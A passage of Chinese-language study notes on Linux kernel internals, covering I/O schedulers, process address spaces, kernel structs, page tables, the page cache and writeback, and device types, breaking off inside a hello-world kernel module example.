<p>请求队列表中每一项都是一个单独的请求，由结构体request表示，定义在文件&lt;linux/blkdev.h&gt;中。每个请求可以由多个bio结构体组成。</p>
<h3 id="I-O调度程序"><a href="#I-O调度程序" class="headerlink" title="I/O调度程序"></a>I/O调度程序</h3><p>内核中负责请求I/O请求的子系统称为I/O调度程序。</p>
<p>I/O调度程序将磁盘I/O资源分配给系统中所有挂起的块I/O请求。具体地说，这种资源分配是通过请求队列中挂起的请求合并和排序来完成的。</p>
<h4 id="I-O调度程序的工作"><a href="#I-O调度程序的工作" class="headerlink" title="I/O调度程序的工作"></a>I/O调度程序的工作</h4><p>I/O调度程序的工作是管理设备的请求队列。它决定队列中的请求排序顺序以及在什么时刻派发请求到块设备。</p>
<p>I/O调度程序通过两种方法减少磁盘寻址时间：合并与排序。</p>
<p>合并指将两个或多个请求结合成一个新请求。</p>
<p>整个请求队列将按扇区增长方向有序排列。该排序算法类似于电梯调度。所以I/O程序（或这种排序算法）称作电梯调度。</p>
<h4 id="Linus电梯"><a href="#Linus电梯" class="headerlink" title="Linus电梯"></a>Linus电梯</h4><p>Linus电梯能执行合并与排序预处理。</p>
<p>当一个请求加入队列中时，有可能发生四种操作：</p>
<ol>
<li>如果队列中已存在一个对相邻磁盘扇区操作的请求，那么新请求将和这个已经存在的请求合并成一个请求。</li>
<li>如果队列中存在一个驻留时间过长的请求，那么新请求将被插入到队列尾部，以防止其他旧的请求饥饿发生。</li>
<li>如果队列中以扇区方向为序而存在合适的插入位置，那么新的请求将被插入到该位置，保证队列中的请求是以被访问磁盘物理位置为序进行排列的。</li>
<li>如果队列中不存在合适的请求插入位置，请求将被插入到队列尾部。</li>
</ol>
<h4 id="最终期限I-O调度程序"><a href="#最终期限I-O调度程序" class="headerlink" title="最终期限I/O调度程序"></a>最终期限I/O调度程序</h4><p>在最后期限I/O调度程序中，每个请求都有一个超时时间。</p>
<p>最后期限I/O调度请求以磁盘物理位置为次序维护请求队列，这个队列称为排序队列。读请求按次序被插入到特定的读FIFO队列中，写请求被插入到特定的写FIFO队列中。</p>
<p>对于普通操作来说，最后期限I/O调度程序将请求从排序队列头部取下，再推入到派发队列中，然后派发队列将请求提交给磁盘驱动，从而保证了最小化的请求寻址。</p>
<p>如果在写FIFO队列头，或是读FIFO队列头的请求超时，那么最后期限I/O调度程序便从FIFO队列中提取请求进行服务。</p>
<p><img src="./img/1586935266.jpg" alt="最后期限I/O调度程序的三个队列"></p>
<p>最后期限I/O调度程序的实现在block/deadline-iosched.c中。</p>
<h4 id="预测I-O调度程序"><a href="#预测I-O调度程序" class="headerlink" title="预测I/O调度程序"></a>预测I/O调度程序</h4><p>预测I/O调度程序也实现了三个队列（加上一个派发队列），并为每个请求设置了超时时间。同时还增加了预测启发能力。</p>
<p>预测I/O调度程序在请求提交后并不直接返回处理其他请求，而是会有意空闲片刻（可设置，默认6ms）。这个空闲时间内，任何对相邻磁盘位置操作的请求都会立刻得到处理。在等待时间结束后，预测I/O调度程序重新返回原来的位置，继续执行以前剩下的请求。</p>
<p>预测I/O调度程序的实现在文件内核源代码树的block/as-iosched.c中。</p>
<h4 id="完全公正的排队I-O调度程序-CFQ"><a href="#完全公正的排队I-O调度程序-CFQ" class="headerlink" title="完全公正的排队I/O调度程序(CFQ)"></a>完全公正的排队I/O调度程序(CFQ)</h4><p>CFQ I/O调度程序把进入I/O请求放入特定的队列中，这种队列是根据引起I/O请求的进程组织的。每个队列中，刚进入的请求与相邻请求合并在一起，并进行插入分类。队列由此按扇区方式分类。</p>
<p>CFQ I/O调度程序以时间片轮转调度队列，每个队列中选取请求数，然后进行下一轮调度。</p>
<p>完全公正的排队I/O调度程序位于block/cfg-iosched.c。</p>
<h4 id="空操作的I-O调度程序"><a href="#空操作的I-O调度程序" class="headerlink" title="空操作的I/O调度程序"></a>空操作的I/O调度程序</h4><p>空操作(Noop)I/O调度程序不进行排序，也不进行其他形式的预寻址操作。但仍执行合并操作：当一个新的请求提交到队列时，就把它与任一相邻的请求合并，它只是维护请求队列以近乎FIFO的顺序排列，块设备驱动程序便可以从这种队列中摘取请求。</p>
<p>空操作i/o调度程序位于block/noop-iosched.c，它是专为随机访问设备而设计的。</p>
<h4 id="I-O调度程序的选择"><a href="#I-O调度程序的选择" class="headerlink" title="I/O调度程序的选择"></a>I/O调度程序的选择</h4><p>可以通过命令行选项：elevator=foo来启用foo（有效而激活的I/O调度程序）给所有的块设备。</p>
<h2 id="进程地址空间"><a href="#进程地址空间" class="headerlink" title="进程地址空间"></a>进程地址空间</h2><h3 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h3><p>进程地址空间由进程可寻址的虚拟内存组成。每一个进程都有一个32或64位的平坦(flat)地址空间，空间的具体大小取决于体系结构。平坦指的是地址空间范围是一个独立的连续区间。</p>
<p>一个进程的地址空间与另一个进程的地址空间即使有相同的内存地址，实际上也彼此互不相干，我们称这样的进程为线程。</p>
<p>可被访问的合法地址空间称为内存区域。通过内核，进程可以给自己的地址空间动态地添加或减少内存区域。</p>
<p>进程只能访问有效内存区域内的内存地址。</p>
<h3 id="内存描述符"><a href="#内存描述符" class="headerlink" title="内存描述符"></a>内存描述符</h3><p>内核使用内存描述符结构体表示进程的地址空间。内存描述符由mm_struct结构体表示，定义在&lt;linux/mm_types.h&gt;中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">mm_rb</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap_cache</span>;</span></span><br><span class="line">	<span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span> <span class="params">(struct file *filp,</span></span></span><br><span class="line"><span class="function"><span class="params">				<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params">				<span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span>;</span><br><span class="line">	<span class="keyword">void</span> (*unmap_area) (struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_base;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> task_size;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> cached_hole_size;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> free_area_cache;</span><br><span class="line">	<span class="keyword">pgd_t</span> * pgd;</span><br><span class="line">	<span class="keyword">atomic_t</span> mm_users;</span><br><span class="line">	<span class="keyword">atomic_t</span> mm_count;</span><br><span class="line">	<span class="keyword">int</span> map_count;</span><br><span class="line">	<span class="keyword">int</span> core_waiters;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">mmap_sem</span>;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> page_table_lock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mmlist</span>;</span></span><br><span class="line">	<span class="keyword">mm_counter_t</span> _file_rss;</span><br><span class="line">	<span class="keyword">mm_counter_t</span> _anon_rss;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> hiwater_rss;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> hiwater_vm;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> total_vm, locked_vm, shared_vm, exec_vm;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> stack_vm, reserved_vm, def_flags, nr_ptes;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> start_code, end_code, start_data, end_data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> start_brk, brk, start_stack;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> arg_start, arg_end, env_start, env_end;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> saved_auxv[AT_VECTOR_SIZE];</span><br><span class="line">	<span class="keyword">cpumask_t</span> cpu_vm_mask;</span><br><span class="line">	<span class="keyword">mm_context_t</span> context;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> faultstamp;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> token_priority;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> last_interval;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">core_startup_done</span>, <span class="title">core_done</span>;</span></span><br><span class="line">	<span class="keyword">rwlock_t</span>		ioctx_list_lock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kioctx</span>		*<span class="title">ioctx_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MM_OWNER</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PROC_FS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">exe_file</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> num_exe_file_vmas;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>mm_users域记录正在使用该地址的进程数目。mm_count域是mm_struct结构体的主引用计数。如果mm_users减为0，则mm_count减1。若mm_count为0，则说明没有任何指向该mm_struct结构体的引用了，这时该结构体会被撤销。当内核在一个地址空间上操作，并需要使用与该地址相关联的引用计数时，内核便增加mm_count。</p>
<p>mmap和mm_rb这两个不同的数据结构体描述的对象是相同的：该地址空间中的全部内存区域。但mmap以链表形式存放，而mm_rb以红-黑树形式存放。</p>
<p>所有的mm_struct结构体都通过自身的mmlist域链接在一个双向链表中，该链表的首元素是init_mm内存描述符，它代表init进程的地址空间。</p>
<h4 id="分配内存描述符"><a href="#分配内存描述符" class="headerlink" title="分配内存描述符"></a>分配内存描述符</h4><p>在进程的进程描述符中的mm预存放着该进程使用的内存描述符。</p>
<h4 id="撤销内存描述符"><a href="#撤销内存描述符" class="headerlink" title="撤销内存描述符"></a>撤销内存描述符</h4><p>当进程退出时，内核会调用定义在kernel/exit.c中的exit_mm()函数，该函数执行一些常规的撤销工作，同时更新一些统计量。</p>
<h4 id="mm-struct与内核线程"><a href="#mm-struct与内核线程" class="headerlink" title="mm_struct与内核线程"></a>mm_struct与内核线程</h4><p>内核线程没有进程地址空间，也没有相关的内存描述符，所以内核线程对应的进程描述符中的mm域为空。</p>
<p>为了避免内核线程为内存描述符合页表浪费内存，也为了当新内核线程运行时，避免浪费处理器周期向新地址空间进行切换，内核将直接使用前一个进程的内存描述符。</p>
<h3 id="虚拟内存区域"><a href="#虚拟内存区域" class="headerlink" title="虚拟内存区域"></a>虚拟内存区域</h3><p>内存区域由vm_area_struct结构体表示，定义在&lt;linux/mm_types.h&gt;中。内存区域在Linux内核中也经常被称作虚拟内存区域（VMAS）。</p>
<p>vm_area_struct结构体描述了指定地址空间内连续区间上的一个独立内存范围。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> * <span class="title">vm_mm</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;	<span class="comment">//指向区间的首地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;	<span class="comment">//指向区间的尾地址</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>;</span></span><br><span class="line">	<span class="keyword">pgprot_t</span> vm_page_prot;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">			<span class="keyword">void</span> *parent;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">head</span>;</span></span><br><span class="line">		&#125; vm_set;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">raw_prio_tree_node</span> <span class="title">prio_tree_node</span>;</span></span><br><span class="line">	&#125; shared;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_node</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> * <span class="title">vm_ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_pgoff;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">vm_file</span>;</span></span><br><span class="line">	<span class="keyword">void</span> * vm_private_data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_truncate_count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="keyword">atomic_t</span> vm_usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">vm_policy</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>每个内存描述符都对应于进程地址空间中的唯一区间。</p>
<p>vm_mm域指向和VMA相关的mm_struct结构体。注：每个VMA对其相关的mm_struct结构体来说都是唯一的。</p>
<h4 id="VMA标志"><a href="#VMA标志" class="headerlink" title="VMA标志"></a>VMA标志</h4><p>VMA标志是一种位标志，定义在&lt;linux/mm.h&gt;中。其包含在vm_flags域内，标志了内存区域所包含的页面的行为和信息。</p>
<h4 id="VMA操作"><a href="#VMA操作" class="headerlink" title="VMA操作"></a>VMA操作</h4><p>vm_ops域指向与指定内存区域相关的操作函数表，内核使用表中的方法操作VMA。</p>
<p>操作函数表由vm_operations_struct结构体表示，定义在文件&lt;linux/mm.h&gt;中。</p>
<h4 id="内存区域的树型结构和内存区域的链表结构"><a href="#内存区域的树型结构和内存区域的链表结构" class="headerlink" title="内存区域的树型结构和内存区域的链表结构"></a>内存区域的树型结构和内存区域的链表结构</h4><p>mmap域使用单独链表连接所有的内存区域对象。每一个vm_area_struct结构体通过自身的vm_next域被连入链表，所有区域按地址增长的方向排序，mmap域指向链表中第一个内存区域，链表中最后一个结构体指针指向空。</p>
<p>mm_rb域使用红-黑树连接所有的内存区域对象。mm_rb域指向红-黑树的根节点，地址空间中每一个vm_area_struct结构体通过自身的vm_rb域连接到树中。</p>
<h4 id="实际中使用的内存区域文件"><a href="#实际中使用的内存区域文件" class="headerlink" title="实际中使用的内存区域文件"></a>实际中使用的内存区域文件</h4><p>可以使用/proc文件系统和pmmap工具查看给定进程的内存空间和其中所包含的内存区域。</p>
<p>/proc/&lt;pid&gt;/maps的输出显示了进程地址空间中的全部内存区域。</p>
<p>没有映射文件的内存区域的设备标志位00:00，索引节点标志也为0，这个区域就是零页——零页映射的内存全为0。如果零页映射到可写的内存区域，那么该区域将全被初始化为0。</p>
<h3 id="操作内存区域"><a href="#操作内存区域" class="headerlink" title="操作内存区域"></a>操作内存区域</h3><p>为方便执行对内存区域的操作，内核定义了许多辅助函数，它们都声明在&lt;linux/mm.h&gt;中。</p>
<h3 id="mmap-和do-mmap-创建地址区间"><a href="#mmap-和do-mmap-创建地址区间" class="headerlink" title="mmap()和do_mmap():创建地址区间"></a>mmap()和do_mmap():创建地址区间</h3><p>内核使用do_mmap()函数创建一个新的线性地址区间。</p>
<p>do_mmap()函数定义在文件&lt;linux/mm.h&gt;中。</p>
<p>如果系统调用do_mmap()的参数中有无效参数，那么它返回一个负值；否则，它会在虚拟内存中分配一个合适的新内存区域。如果有可能的话，将新区域和邻近区域进行合并，否则内核从vm_area_cachep长字节(slab)缓存中分配一个vm_area_struct结构体，并使用vm_link()函数将新分配的内存区域添加到地址空间的内存区域链表和红-黑树中，随后还要更新内存描述符中的total_vm域，然后才返回新分配的地址区间的初始地址。</p>
<p>在用户空间可以通过mmap()系统调用获取内核函数do_mmap()的功能。</p>
<h4 id="mummap-和do-mummap-：删除地址区间"><a href="#mummap-和do-mummap-：删除地址区间" class="headerlink" title="mummap()和do_mummap()：删除地址区间"></a>mummap()和do_mummap()：删除地址区间</h4><p>do_mummap()函数从特定的进程地址空间中删除指定地址区间，该函数定义在文件&lt;linux/mm.h&gt;中。</p>
<p>系统调用mummap()给用户空间提供了一种从自身地址空间中删除指定地址区间的方法。该系统调用定义在文件mm/map.c中，它是对do_mummap()函数的一个简单的封装。</p>
<h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>当用程序访问一个虚拟地址时，首先必须将虚拟地址转化为物理地址，然后处理器才能解析地址访问请求。地址的转换工作需要通过查询页表才能完成。</p>
<p>Linux中使用三级页表完成地址转换：</p>
<ol>
<li>顶级页表是页全局目录（PGD），它包含一个pgd_t类型数组，多数体系结构中pgd_t类型等同于无符号长整型类型。PGD中的表项指向二级页目录中的表项：PMD。</li>
<li>二级页表是中间页目录（PMD），它是个pmd_t类型数组，其中的表项指向PTE中的表项。</li>
<li>最后一级的页表简称页表，其中包含了pte_t类型的页表项，该页表项指向物理页面。</li>
</ol>
<p><img src="./img/1587021913.jpg" alt="虚拟——物理地址查询"></p>
<p>每个进程都有自己的页表（线程会共享页表），内存描述符的pgd域指向的就是进程的页全局目录。</p>
<p>页表对应的结构体依赖于具体的体系结构，定义在&lt;asm/page.h&gt;中。</p>
<p>为了加快搜索，多数体系结构都实现了一个翻译后缓冲器（TLB）。TLB作为一个将虚拟地址映射到物理地址的硬件缓存，当请求访问一个虚拟地址时，处理器首先检查TLB中是否缓存了该虚拟地址到物理地址的映射，如果在缓存中直接命中，物理地址立刻返回；否则，就需要再通过页表搜索需要的物理地址。</p>
<h2 id="页高速缓存和页回写"><a href="#页高速缓存和页回写" class="headerlink" title="页高速缓存和页回写"></a>页高速缓存和页回写</h2><p>页高速缓存是Linux内核实现磁盘缓存。主要用来减少对磁盘I/O操作。</p>
<h3 id="缓存手段"><a href="#缓存手段" class="headerlink" title="缓存手段"></a>缓存手段</h3><p>页高速缓存是由内存中的物理页面组成的，其内容对应磁盘上的物理块。页高速缓存大小能动态调整，我们称正被缓存的存储设备为后备存储。</p>
<h4 id="写缓存"><a href="#写缓存" class="headerlink" title="写缓存"></a>写缓存</h4><p>缓存一般被实现下面三种策略之一：</p>
<p>第一种策略，不缓存，即高速缓存不去缓存任何写操作。</p>
<p>第二种策略，写操作自动更新内存缓冲，同时也更新磁盘文件，这种方式，通常称为写透缓存。</p>
<p>第三种策略，也是Linux所采用的，称为“回写”。这种策略下，程序执行写操作直接写到缓存中，后端存储不会立刻直接更新，而是将页高速缓存中被写入的页面标记成“赃”，并且被加入到赃页链表中。然后由一个进程（回写进程）周期性将赃页链表中的页写回到磁盘中，然后再清理“赃”页标志。</p>
<h4 id="缓存回收"><a href="#缓存回收" class="headerlink" title="缓存回收"></a>缓存回收</h4><p>决定缓存中什么内容将被清除的策略，被称为缓存回收策略。</p>
<p>Linux的缓存回收是通过选择干净页进行简单的替换。如果缓存中没有足够的干净页面，内核将强制地进行回写操作，以腾出更多的干净可用页。</p>
<h5 id="最近最少使用"><a href="#最近最少使用" class="headerlink" title="最近最少使用"></a>最近最少使用</h5><p>缓存回收策略通过所访问的数据特性，尽量追求预测效率。最成功的算法称作最近最少使用算法(LRU)。</p>
<p>LRU回收策略需要跟着每个页面的访问踪迹（或者至少按照访问时间为序的页链表），以便能回收最老时间戳的页面（或者回收排序链表头所指的页面）</p>
<h5 id="双链策略"><a href="#双链策略" class="headerlink" title="双链策略"></a>双链策略</h5><p>Linux实现的是一个修改过的LRU，也称为双链策略。</p>
<p>Linux维护两个链表：活跃链表和非活跃链表。处于活跃链表上的页面不会被换出，而在非活跃链表上的页面则是可以被换出的。在活跃链表中的页面必须在其被访问时就处于非活跃链表中。</p>
<p>两个链表都被伪LRU规则维护：页面从尾部加入，从头部移除，如同队列。两个链表需要维持平衡——如果活跃链表变得过多而超过了非活跃链表，那么活跃链表的头页面将被重新移回到非活跃链表中，以便能再被回收。</p>
<h3 id="Linux页高速缓存"><a href="#Linux页高速缓存" class="headerlink" title="Linux页高速缓存"></a>Linux页高速缓存</h3><p>页高速缓存缓存的是内存页面。</p>
<h4 id="address-space对象"><a href="#address-space对象" class="headerlink" title="address_space对象"></a>address_space对象</h4><p>为了维持页高速缓存的普遍性，Linux页高速缓存使用了一个新对象管理缓存项和页I/O操作，这个对象是address_space结构体，定义在文件&lt;linux/fs.h&gt;中。这个结构体是vm_area_struct的物理地址对等体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">host</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">radix_tree_root</span>	<span class="title">page_tree</span>;</span></span><br><span class="line">	<span class="keyword">rwlock_t</span>		tree_lock;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		i_mmap_writable;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">prio_tree_root</span>	<span class="title">i_mmap</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">i_mmap_nonlinear</span>;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span>		i_mmap_lock;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		truncate_count;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nrpages;</span><br><span class="line">	<span class="keyword">pgoff_t</span>			writeback_index;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">address_space_operations</span> *<span class="title">a_ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">backing_dev_info</span> *<span class="title">backing_dev_info</span>;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span>		private_lock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">private_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">assoc_mapping</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中i_mmap字段是一个优先搜索树，它的搜索范围包括了再address_spcae中所有共享的私有映射页面。</p>
<p>address_space页总数由nrpage描述。</p>
<p>address_spcae结构体与索引节点（inode）关联，这时host域会指向该索引节点；如果关联对象不是一个索引节点的话，host域会被置为NULL。</p>
<h4 id="address-spcae操作"><a href="#address-spcae操作" class="headerlink" title="address_spcae操作"></a>address_spcae操作</h4><p>a_ops域指向地址空间对象中的操作函数表，定义在文件&lt;linux/fs.h&gt;中，由address_space_operations结构来表示。</p>
<p>每个后备存储都通过自己的address_space_operation描述自己如何与页高速缓存交互。</p>
<h4 id="基树"><a href="#基树" class="headerlink" title="基树"></a>基树</h4><p>每个address_space对象都有唯一的基树，它保存在page_tree结构体中。</p>
<p>基树是一个二叉树，只要指定了文件偏移量，就可以在基树中迅速检索到希望的页。</p>
<p>基树核心代码的通用形式可以在文件lib/radix-tree.c中找到，声明在&lt;linux/radix_tree.h&gt;中。</p>
<h3 id="缓冲区高速缓存"><a href="#缓冲区高速缓存" class="headerlink" title="缓冲区高速缓存"></a>缓冲区高速缓存</h3><p>缓存的作用是映射内存中的页面到磁盘块，从而在块I/O操作时也减少了磁盘访问。这个缓存通常称为缓冲区高速缓存</p>
<h3 id="flusher线程"><a href="#flusher线程" class="headerlink" title="flusher线程"></a>flusher线程</h3><p>当页高速缓存中的数据比后台存储的数据更新时，该数据就称作赃数据。在以下3种情况发生时，赃页被写会磁盘：</p>
<ul>
<li>当空闲内存低于一个特定的阈值时，内核必须将赃页写回磁盘以便释放内存。</li>
<li>当赃页在内存找那个驻留时间超过一个特定的阈值时，内核必须将超时的赃页写回磁盘，以确保赃页不会无限期地驻留在内存中。</li>
<li>当用户进程调用sync()和fsync()系统调用时，内核会按要求执行回写动作。</li>
</ul>
<p>在2.6内核中，由一群内核线程（flusher线程）执行这三种工作。</p>
<p>当空闲内存比阈值dirty_backgrount_ratio还低时，内核便会调用函数flusher_threads()唤醒一个或多个flusher线程。同时，flusher线程后台例程会被周期性唤醒（被定时器唤醒）。</p>
<p>系统管理员可以在/proc/sys/vm中设置回写相关的参数，也可以通过sysctl系统调用设置它们。</p>
<p>flusher线程的实现代码在文件mm/page-writeback.c和mm/backing-dev.c中，回写机制的实现代码在文件fs/fs-writeback.c中。</p>
<h4 id="膝上型计算机模式"><a href="#膝上型计算机模式" class="headerlink" title="膝上型计算机模式"></a>膝上型计算机模式</h4><p>膝上型计算机模式是一种特殊的页回写策略。该模式可通过/proc/sys/vm/laptop_mode文件进行配置，如果需要启用，则像配置文件中写入1.</p>
<p>膝上型计算机模式除了当缓存中的页面太旧时要执行回写赃页以外，flusher还会找准磁盘运转的时机，把所有其他的物理磁盘I/O、刷新赃缓冲等通通写回磁盘，以便保证不会专门为了写磁盘而去主动激活磁盘运行。</p>
<h2 id="设备与模块"><a href="#设备与模块" class="headerlink" title="设备与模块"></a>设备与模块</h2><p>设备类型：在所有Unix系统中为了统一普通设备的操作所采用的分类。</p>
<p>模块：Linux内核中用于按需加载和卸载目标码的机制。</p>
<p>内核对象：内核数据结构中支持面向对象的简单操作，还支持维护对象之间的父子关系。</p>
<p>sysfs：表示系统中设备树的一个文件系统。</p>
<h3 id="设备类型"><a href="#设备类型" class="headerlink" title="设备类型"></a>设备类型</h3><p>在Linux以及所有Unix系统中，设备被分为以下三种类型：</p>
<ul>
<li>块设备</li>
<li>字符设备</li>
<li>网络设备</li>
</ul>
<p>块设备通常缩写为blkdev，它是可寻址的，寻址以块为单位，块大小随设备不同而不同；块设备通常支持重定位操作，也就是对数据的随机访问。块设备是通过称为“块设备节点”的特殊文件来访问的，并且通常被挂载为文件系统。</p>
<p>字符设备通常缩写为cdev，它是不可寻址的，仅提供数据的流式访问，就是一个个字符，或者一个个字节。字符设备是通过称为“字符设备节点”的特殊文件来访问的。应用程序通过直接访问设备节点与字符设备交互。</p>
<p>网络设备是通过套接字API这样的特殊接口来访问。</p>
<p>有些设备驱动是虚拟的，仅提供访问内核功能而已，我们称之为“伪设备”，如内核随机数发生器（通过/dev/random和/dev/urandom访问）、空设备（通过/dev/null访问）、零设备（通过/dev/zero访问）、满设备（通过/dev/full访问），还有内存设备（通过/dev/mem访问）。然而，大部分设备驱动是表示物理设备的。</p>
<h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>Linux是“单块内核”的操作系统——即整个系统内核都运行于一个单独的保护域中。但Linux内核是模块化组成的，它允许内核在运行时动态地向其中插入或从中删除代码。这些代码被一并组合在一个单独的二进制镜像中，即所谓的可装载内核模块中，或简称为模块。</p>
<h4 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello, World!"></a>Hello, World!</h4><p>内核模块的Hello world!代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">"Hello world!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">"Godbye!"</span>);</span><br><span class="line">&#125;</span><br><span 